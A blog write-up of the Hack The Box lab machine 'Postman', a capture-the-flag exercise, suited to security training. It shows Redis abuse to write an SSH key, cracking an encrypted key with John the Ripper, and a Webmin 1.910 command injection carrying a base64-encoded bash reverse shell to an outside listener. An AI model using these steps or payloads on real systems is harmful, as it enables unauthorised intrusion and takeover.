---
id: 3565
title: 'Hackthebox &#8211; Postman'
date: '2022-04-15T12:49:06+00:00'
author: vedanttare
excerpt: 'In this post, we are going to be pwning "Postman" from Hackthebox.'
layout: post
guid: 'http://vedanttare.com/?p=3565'
permalink: /hackthebox-postman/
powerkit_share_buttons_transient_facebook:
    - '1692134044'
powerkit_share_buttons_transient_pinterest:
    - '1727981583'
image: 'http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-2.42.07-PM1-496x166.png'
categories:
    - Writeups
---

![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-11.33.14-AM.png)

IP: 10.10.10.160

More information:  
DNS name: Postman.htb  
Server exposed on ssl cert: Webmin Webserver on Postman  
username leaked on ssl cert: root@Postman.htb  
REMEMBER THIS: Webmin uses local authentication so it is very difficult to decipher the creds, so you should most probably leave that port and move onto some other port as such.

## Enumeration

Let’s start off with a basic nmap scan: `sudo nmap -sC -sV -O -p- -oA nmap/postman 10.10.10.160`, we get,

Ports open:

- 22/ssh
- 80/http
- 10000/webmin/http
- 6379/redis

Port 22:  
Nothing interesting

Port 80:  
It was basically a decoy and didn’t have anything interesting.

Port 10000:  
Webmin 1.910 – Required creds to get in, default creds didn’t work. Webmin mostly uses local authentication so its difficult to get in with default creds or by bruteforcing.

Webmin page:

![](http://vedanttare.com/wp-content/uploads/2022/04/webmin-page.png)

Port 6379 (redis):

This port is basically a data structure store or basically a database and can be accessed through the command line. Some redis commands are:  
`INFO (imp information)<br></br>CONFIG GET * (gives you the configuration of some things)`  
Dumping the database:  
`SELECT 0 or 1 (depending on the numbering of the database)<br></br>KEYS *<br></br>GET`

Using ssh:

When we used CONFIG GET \* we can find the home of the redis user (which is usually /var/lib/redis), and after knowing this we can write the authenticated\_users file to access via ssh with the user creds. Also check any other location where you have writable permissions. Generate a public-private key pair on your computer: `ssh-keygen -t rsa`

Write the public key to a file: `(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt`

Import the file into redis: `cat foo.txt | redis-cli -h 10.85.0.52 -x set crackit`

Now save the public key to the authorized\_keys file on redis server using redis-cli:  
`redis-cli -h 10.10.10.160`

`config set dir /var/lib/redis/.ssh/<br></br>OK`

`config set dbfilename “authorized_keys”<br></br>OK`

`save<br></br>OK`

## Exploitation

Logging into the machine using ssh with private key that we generated earlier:  
`ssh -i id_rsa redis@10.10.10.160`

We see that we are user redis and we need to still get a user and then root. After running LinEnum.sh we find out that there is a id\_rsa.bak which is a backup private key file.

![](http://vedanttare.com/wp-content/uploads/2022/04/bak-file-linenum.png)

Now, we check the contents of the file and see that it is an encrypted private ssh key.

![](http://vedanttare.com/wp-content/uploads/2022/04/ssh-key.png)

We now can crack this encrypted key by using johntheripper tool.

`kali@starscorp1o:~/…/retired/postman$ python /usr/share/john/ssh2john.py id_rsa > id_rsa_new`

Then,

`kali@starscorp1o:~/…/retired/postman$ john id_rsa_new --wordlist=/home/kali/rockyou.txt<br></br>Using default input encoding: UTF-8<br></br>Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])<br></br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes<br></br>Cost 2 (iteration count) is 2 for all loaded hashes<br></br>Note: This format may emit false positives, so it will keep trying even after<br></br>finding a possible candidate.<br></br>Press 'q' or Ctrl-C to abort, almost any other key for status<br></br>computer2008 (id_rsa)<br></br>1g 0:00:00:33 DONE (2020-12-24 01:05) 0.03010g/s 431718p/s 431718c/s 431718C/s *7¡Vamos!<br></br>Session completed`

We have found the password which is: `computer2008`

If we directly try to ssh with the password it doesn’t work. If we try to use the key and then ssh with it that also doesn’t work. If we try and su to the user: `su Matt` – This works!!!!

![](http://vedanttare.com/wp-content/uploads/2022/04/the-user-flag.png)

Now we run Linenum.sh again, but don’t find anything interesting as such.

Important link for the exploit:

https://github.com/KyleV98/Webmin-1.910-Exploit/blob/master/Webmin%201.910%20-%20Remote%20Code%20Execution%20using%20BurpSuite#L45

## Privilege Escalation

After running LinEnum.sh we don’t get anything interesting as such. Now if we recall we know that there is port 10000 which is open and has webmin running on it. If we try and use the creds for Matt, we see that we get logged in!!!!

For root, after trying multiple times, we finally get a payload to work.

`‘bash -i >& dev/tcp/10.10.14.14/4445 0>&1’` –&gt; base64 encode this and use it as the payload.

After reading the exploit in which metasploit was used we could see that a POST request was sent to /package-updates/update.cgi and then we can use this to inject our payload in the u parameter or field.

![](http://vedanttare.com/wp-content/uploads/2022/04/burp-postman.png)

Payload: `u=acl%2Fapt&u=+|+bash+-c+"{echo,- n,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ1IDA%2bJjE%3d}|{base64,-d}|{bash,-i}"`

`u=acl%2Fapt` –&gt; This is very important, without this line it won’t work at all!!!!

`bash -i >& dev/tcp/10.10.14.14/4445 0>&1 ---→ Base64 encoded --→ YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ1IDA+JjE= ---→ URL encoded ---→ YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ1IDA%2bJjE%3d`

Then we setup a reverse listener and get ROOT!!!

![](http://vedanttare.com/wp-content/uploads/2022/04/root-from-listener.png)

Now, we can grab the root flag,

![](http://vedanttare.com/wp-content/uploads/2022/04/the-root-flag.png)